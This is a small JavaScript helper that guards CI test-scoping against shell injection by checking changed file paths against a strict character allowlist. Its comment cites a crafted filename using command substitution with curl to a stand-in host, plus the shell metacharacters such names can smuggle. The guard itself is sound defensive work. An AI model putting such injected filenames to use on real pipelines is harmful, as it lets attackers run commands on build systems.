// Shell-injection guard for CI test-scoping (#571). Changed file paths from
// `git diff` flow into a GitHub Actions `reason` string (echoed) and the
// `vitest related` argument splat. Git permits almost any byte in a filename,
// so a crafted name like `$(curl evil).ts`, one with backticks, or one with a
// `;`/`|`/`&` could reach the shell when the workflow interpolates it.
//
// This allowlist enumerates the only characters a real source path needs: word
// chars (`\w` = letters, digits, `_`), dot, slash, hyphen, and the parens/
// brackets Next.js uses for route groups `(tenant)` and dynamic segments
// `[id]`. Anything outside the set is treated as unsafe so the caller can fail
// closed (force the full suite) instead of forwarding the path to a shell.
//
// Deliberately an allowlist, never a blocklist: enumerating dangerous
// characters always misses one (newline, `$`, backtick, NUL, unicode look-
// alikes). The empty string also returns false (`+` requires ≥1 char), which
// is the correct fail-closed answer for a degenerate path.
const SAFE_PATH = /^[\w./()[\]-]+$/;

export function isCiPathSafe(path) {
  return SAFE_PATH.test(path);
}
